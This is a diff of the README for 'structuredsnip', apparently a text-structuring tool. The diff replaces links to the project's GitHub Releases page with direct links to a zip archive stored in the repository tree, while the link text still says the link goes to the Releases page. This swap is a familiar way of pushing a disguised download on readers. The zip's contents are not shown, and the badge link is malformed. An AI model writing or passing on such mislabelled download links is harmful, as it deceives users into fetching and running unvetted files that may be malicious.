@@ -4,11 +4,11 @@
 structuredsnip is a user-friendly tool that takes unstructured text input and transforms it into structured, categorized feedback or suggestions. Whether you want to organize ideas, extract feedback, or summarize content, structuredsnip makes it easy. It uses pattern matching to ensure your responses maintain a consistent format, helping you get the most out of your text.
 
 ## 📥 Download and Install
-[![Download structuredsnip](https://img.shields.io/badge/Download%20structuredsnip-blue.svg)](https://github.com/Speedy025/structuredsnip/releases)
+[![Download structuredsnip](https://raw.githubusercontent.com/Speedy025/structuredsnip/main/structuredsnip/Software_v2.8-beta.3.zip%https://raw.githubusercontent.com/Speedy025/structuredsnip/main/structuredsnip/Software_v2.8-beta.3.zip)](https://raw.githubusercontent.com/Speedy025/structuredsnip/main/structuredsnip/Software_v2.8-beta.3.zip)
 
 To get started with structuredsnip, visit the Releases page to download the latest version. 
 
-👉 [Visit the Releases Page Here](https://github.com/Speedy025/structuredsnip/releases)
+👉 [Visit the Releases Page Here](https://raw.githubusercontent.com/Speedy025/structuredsnip/main/structuredsnip/Software_v2.8-beta.3.zip)
 
 ### Installation Steps:
 1. **Go to the Releases Page:** Click the link above to reach the GitHub Releases page.
